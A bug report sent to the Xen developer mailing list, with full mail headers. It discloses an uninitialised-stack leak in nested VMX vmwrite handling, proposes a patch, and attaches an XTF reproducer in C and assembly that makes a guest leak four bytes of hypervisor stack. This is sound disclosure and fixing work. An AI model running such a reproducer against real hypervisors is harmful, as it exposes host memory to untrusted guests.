Return-Path: <xen-devel-bounces@lists.xenproject.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from lists.xenproject.org (lists.xenproject.org [192.237.175.120])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id ECE5BC43458
	for <xen-devel@archiver.kernel.org>; Thu, 16 Jul 2026 05:16:11 +0000 (UTC)
Received: from list by lists.xenproject.org with outflank-mailman.1363393.1615072 (Exim 4.92)
	(envelope-from <xen-devel-bounces@lists.xenproject.org>)
	id 1wkERY-0005Ho-Jq; Thu, 16 Jul 2026 05:15:32 +0000
X-Outflank-Mailman: Message body and most headers restored to incoming version
Received: by outflank-mailman (output) from mailman id 1363393.1615072; Thu, 16 Jul 2026 05:15:32 +0000
Received: from localhost ([127.0.0.1] helo=lists.xenproject.org)
	by lists.xenproject.org with esmtp (Exim 4.92)
	(envelope-from <xen-devel-bounces@lists.xenproject.org>)
	id 1wkERY-0005Hf-EC; Thu, 16 Jul 2026 05:15:32 +0000
Received: by outflank-mailman (input) for mailman id 1363393;
 Wed, 15 Jul 2026 22:06:50 +0000
Received: from mx.expurgate.net ([195.190.135.20])
 by lists.xenproject.org with esmtp (Exim 4.92)
 (envelope-from <hoepf@cit.tum.de>) id 1wk7kc-0004YV-9S
 for xen-devel@lists.xenproject.org; Wed, 15 Jul 2026 22:06:50 +0000
Received: from mx.expurgate.net (helo=localhost) by mx.expurgate.net with esmtp
 id 1wk7kb-00Ca8C-Bu
 for xen-devel@lists.xenproject.org; Thu, 16 Jul 2026 00:06:45 +0200
Received: from [10.42.69.1] (helo=localhost)
 by localhost with ESMTP (eXpurgate MTA 0.9.1)
 (envelope-from <hoepf@cit.tum.de>)
 id 6a58045e-2eae-0a2a0a5409dd-0a2a4501e296-22
 for <xen-devel@lists.xenproject.org>; Thu, 16 Jul 2026 00:06:44 +0200
Received: from [131.159.0.202] (helo=mailout2.rbg.tum.de)
 by tlsNG-d62444.mxtls.expurgate.net with ESMTPS (eXpurgate 4.57.1)
 (envelope-from <hoepf@cit.tum.de>)
 id 6a580474-5984-0a2a45010019-839f00cac8bf-3
 for <xen-devel@lists.xenproject.org>; Thu, 16 Jul 2026 00:06:44 +0200
Received: from mailrelay1n.ito.cit.tum.de (mailrelay1.in.tum.de
 [IPv6:2a09:80c0:254::14])
 by mailout2.rbg.tum.de (Postfix) with ESMTPS id E029F4C024B
 for <xen-devel@lists.xenproject.org>; Thu, 16 Jul 2026 00:06:43 +0200 (CEST)
Received: from mail.in.tum.de (vmrbg426.in.tum.de [131.159.0.73])
 by mailrelay1n.ito.cit.tum.de (Postfix) with ESMTPS id 4h0qyW5TQLz2xKm
 for <xen-devel@lists.xenproject.org>; Thu, 16 Jul 2026 00:06:43 +0200 (CEST)
Received: by mail.in.tum.de (Postfix, from userid 112)
 id B8E3E4A01F6; Thu, 16 Jul 2026 00:06:43 +0200 (CEST)
Received: (Authenticated sender: hoepf)
 by mail.in.tum.de (Postfix) with ESMTPSA id 8CA9E4A01F4
 for <xen-devel@lists.xenproject.org>; Thu, 16 Jul 2026 00:06:39 +0200 (CEST)
 (Extended-Queue-bit xtech_mo@fff.in.tum.de)
X-BeenThere: xen-devel@lists.xenproject.org
List-Id: Xen developer discussion <xen-devel.lists.xenproject.org>
List-Unsubscribe: <https://lists.xenproject.org/mailman/options/xen-devel>,
 <mailto:xen-devel-request@lists.xenproject.org?subject=unsubscribe>
List-Post: <mailto:xen-devel@lists.xenproject.org>
List-Help: <mailto:xen-devel-request@lists.xenproject.org?subject=help>
List-Subscribe: <https://lists.xenproject.org/mailman/listinfo/xen-devel>,
 <mailto:xen-devel-request@lists.xenproject.org?subject=subscribe>
Errors-To: xen-devel-bounces@lists.xenproject.org
Precedence: list
Sender: "Xen-devel" <xen-devel-bounces@lists.xenproject.org>
Authentication-Results: eu.smtp.expurgate.cloud; dkim=pass header.s=20220209 header.d=cit.tum.de header.i="@cit.tum.de" header.h="Date:From:To:Subject"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=cit.tum.de;
	s=20220209; t=1784153203;
	bh=J1ZpW0xJ1BixoNlsZjIQPIC3aPORk3p7rLAuahDIEP0=;
	h=Date:From:To:Subject:From;
	b=B/F2Klp+/M/hs16nNuSNqKHD51iTyGV2nDJDBpbuIDkshNXZ1ZcXHVJMmw1/INFmy
	 KQfkNj/hFKWv/uxZovsBjbNFP3hgpKe4SPixyWRd/+4zO8WmCBF8YnM4hjMkX9Ka5+
	 1IWt5D4uqmXQ0imgmzBcnPdl0rTs5GwqStAWDST0zlUiA97Khfdck9l/K+/xCagrwH
	 l14iRrIXjNt9IVdMk6i1BLv3dfTdV6IaQ6z79wMxE1dmcrdZ+QvewNat7jtu2SIH1m
	 VNIjIb/YD33H0BgvBc7vbGNYaAigazCpupqpBhTQhaBXXl7nWdjGILJElmXJ5frHnD
	 yKJiAW7d3QMzQ==
Date: Thu, 16 Jul 2026 00:06:38 +0200
From: Johann =?utf-8?Q?H=C3=B6pfner?= <hoepf@cit.tum.de>
To: xen-devel@lists.xenproject.org
Subject: [BUG] uninitialised stack memory copied to vmcs12
Message-ID: <alfcosYs35pOCslN@cit.tum.de>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
X-Virus-Scanned: clamav-milter 1.5.3 at itovm121
X-Virus-Status: Clean
X-purgate-ID: tlsNG-d62444/1784153204-1E07B757-EEA506EF/0/0
X-purgate-type: clean
X-purgate-size: 4732

Hello xen-devel@

While fuzzing Xen instrumented by an experimental memory sanitizer, we
discovered the following bug in nested VMX, where a malicious L1 guest
with nestedhvm=1 can read four uninitialised bytes from the hypervisor
vmexit handler stack. 

Specifically nvmx_handle_vmwrite leaves local eight byte variable
'operand' uninitialised. It is then written to by decode_vmx_inst. In
cases where the operand to vmwrite is a r32, r64 or m64, this fully
initializes *poperandS; if however a vmwrite with a 32 bit memory
operand is emulated, hvm_copy_from_guest_linear leaves the upper half of
*poperandS uninitialised. In the case where cpu_has_vmx_shadow_vmcs
returns true, the resulting eight byte value is consequently written to
the vmcs12 unchecked and leaks the four uninitialised bytes into guest
physical memory via the vmcs12.

Attached is a reproducer for XTF which triggers the behavior described
above at least on 4.20 and master versions of Xen running on intel
x86_64 hosts. We would expect there to be the constant 0x99999999, which
we have just vmwritten, somewhere in the unloaded vmcs12, likely zero
extended to eight bytes. However it is stored instead alongside four
bytes read from the hypervisor stack. Currently I am not aware of
security implications for this bug, as I have not been able to leak more
than what appear to be the rather uninteresting upper four bytes of a
pointer.

The same issue exists in nvmx_handle_invept, though no malicious use is
known to me. I suggest fixing both by simply initialising operand / eptp
to 0 in nvmx_handle_vmwrite / nvmx_handle_invept. Patch is given
immediately below, preceding the reproducer.


diff --git a/xen/arch/x86/hvm/vmx/vvmx.c b/xen/arch/x86/hvm/vmx/vvmx.c
index e4cdfe55c1..3f9cf7962e 100644
--- a/xen/arch/x86/hvm/vmx/vvmx.c
+++ b/xen/arch/x86/hvm/vmx/vvmx.c
@@ -1968,7 +1968,7 @@ static int nvmx_handle_vmwrite(struct cpu_user_regs *regs)
 {
     struct vcpu *v = current;
     struct vmx_inst_decoded decode;
-    unsigned long operand; 
+    unsigned long operand = 0;
     u64 vmcs_encoding;
     enum vmx_insn_errno err;
     int rc;
@@ -2012,7 +2012,7 @@ static int nvmx_handle_vmwrite(struct cpu_user_regs *regs)
 static int nvmx_handle_invept(struct cpu_user_regs *regs)
 {
     struct vmx_inst_decoded decode;
-    unsigned long eptp;
+    unsigned long eptp = 0;
     int ret;
 
     if ( (ret = decode_vmx_inst(regs, &decode, &eptp)) != X86EMUL_OKAY )



/** Makefile **/

include $(ROOT)/build/common.mk
NAME      := vmx32
CATEGORY  := functional
TEST-ENVS := hvm32
TEST-EXTRA-CFG := extra.cfg.in
obj-perenv += main.o
include $(ROOT)/build/gen.mk

/** extra.cfg.in **/

nestedhvm = 1

/** main.c **/

#include <xtf.h>
const char test_title[] = "test vmwrite m32 leak";
static uint8_t vmxon_region[PAGE_SIZE] __aligned(PAGE_SIZE);
static uint8_t vmcs_region[PAGE_SIZE] __aligned(PAGE_SIZE);
static uint32_t identity_pde[1024] __aligned(PAGE_SIZE);
void test_main(void) {
  if (!cpu_has_vmx) return xtf_skip("nested VMX required.");

  for (unsigned int i = 0; i < 1024; i++) {
    identity_pde[i] = (i << 22) | 0x83;
  }
  write_cr3(_u(identity_pde));
  write_cr4(read_cr4() | X86_CR4_PSE | X86_CR4_VMXE);
  write_cr0(read_cr0() | X86_CR0_PG | X86_CR0_NE);

  uint32_t rev = (uint32_t)rdmsr(0x480);
  *(uint32_t *)vmxon_region = rev;
  *(uint32_t *)vmcs_region = rev;
  uint32_t vmxon_pa = _u(vmxon_region);
  uint32_t vmcs_pa = _u(vmcs_region);
  uint8_t err;

  uint32_t field = 0x2000;
  uint32_t val = 0x99999999;

  asm volatile("vmxon %[pa]; setbe %[err]" : [err] "=q"(err) : [pa] "m"(vmxon_pa) : "cc", "memory");
  if (err) return xtf_error("Error: VMXON failed\n");
  asm volatile("vmclear %[pa]; setbe %[err]" : [err] "=q"(err) : [pa] "m"(vmcs_pa) : "cc", "memory"); 
  if (err) return xtf_error("Error: VMCLEAR failed\n");
  asm volatile("vmptrld %[pa]; setbe %[err]" : [err] "=q"(err) : [pa] "m"(vmcs_pa) : "cc", "memory");
  if (err) return xtf_error("Error: VMPTRLD failed\n");

  asm volatile("vmwrite %[val], %[field]; setbe %[err]" : [err] "=q"(err) : [val] "m"(val), [field] "r"(field) : "cc", "memory");
  if (err) return xtf_failure("Fail: VMWRITE failed\n");

  asm volatile("vmclear %[pa]; setbe %[err]" : [err] "=q"(err) : [pa] "m"(vmcs_pa) : "cc", "memory");
  if (err) return xtf_error("VMCLEAR failed! Cannot dump.\n");

  for (int i = 0; i < 1024; i++) {
    printk("%08x ", ((uint32_t *)vmcs_pa)[i]); if ((i + 1) % 4 == 0) printk("\n");
  }

  asm volatile("vmptrld %[pa]; setbe %[err]" : [err] "=q"(err) : [pa] "m"(vmcs_pa) : "cc", "memory");
  asm volatile("vmxoff" ::: "cc", "memory");
}

